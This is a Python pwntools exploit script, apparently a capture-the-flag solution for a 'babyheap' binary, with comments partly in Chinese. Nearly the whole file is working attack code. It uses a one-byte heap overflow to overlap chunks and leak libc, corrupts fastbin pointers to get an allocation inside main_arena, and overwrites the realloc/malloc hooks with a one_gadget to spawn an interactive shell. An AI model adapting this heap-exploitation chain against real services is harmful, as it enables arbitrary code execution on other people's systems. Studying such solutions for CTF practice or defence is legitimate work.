#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
host = '127.0.0.1' 
port = 10000
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
#context.terminal =  ['mate-terminal','--geometry=120x54--10+0','--hide-menubar', '-x','sh','-c',]
context.terminal =  ['mate-terminal','--geometry=84x54--10-26','--hide-menubar', '-x','sh','-c',]
exe = './babyheap'
context.binary = exe
elf = ELF(exe)
libc = elf.libc




#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data            : io.send(str(data))
sa   = lambda delim,data      : io.sendafter(str(delim), str(data))
sl   = lambda data            : io.sendline(str(data))
sla  = lambda delim,data      : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096       : io.recv(numb)
ru   = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32 = lambda data            : u32(data.ljust(4, '\x00'))
uu64 = lambda data            : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ga   = lambda job=""          : gdb.attach(io, job) if local else 0
ia   = lambda                 : io.interactive()


# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))
#one_gadget = one_gadget(libc.path)



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def c(idx):
    sla("Command: ", idx)

def new(size):
    c(1)
    sla("Size: ", size)

def update(idx, size, content):
    c(2)
    sla("Index: ", idx)
    sla("Size: ", size)
    sla("Content: ", content)

def show(idx):
    c(4)
    sla("Index: ", idx)

def delete(idx):
    c(3)
    sla("Index: ", idx)



def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)

    #start 
    
    # first leak libc
    new(0x48) # 0
    new(0x48) # 1
    new(0x48) # 2
    new(0x48) # 3
    update(0, 0x49, "a"*0x48 + '\xa1') # 0x50+0x50=0xa0，为了刚好让其重叠
    delete(1)
    new(0x48) # 1
    show(2)
    ru("Chunk[2]: ")
    addr = uu64(r(6))
    
    main_arena = addr - 88
    lg("main_arena", main_arena)
    libc.address = addr - 0x3c4b78
    lg("libc_base", libc.address)
    new(0x48) #4
    new(0x50) #5 这里用来错位伪造的
    delete(5)
    delete(1) 
    delete(2) # 通过修改4可以修改2的fd
    ga()
    
    update(4, 0x9, p64(main_arena+37))
    new(0x48) #1
    new(0x48) #2
    # 这里已经申请到main_arena处地址了，接下来就要修改top chunk了
    # 88-37+0x10因为堆头占0x10
    update(2, 0x2c, "\x00" *0x23 + p64(main_arena-0x38))
    new(0x38) #5
    ga()
    # 修改realloc_hook
    update(5, 0x20, "a"*0x10 + p64(libc.address + one_gadget[1])*2)
    new(0x10)
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("subprocess not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''

if __name__ == '__main__':
    exp(host,True)
    ia()

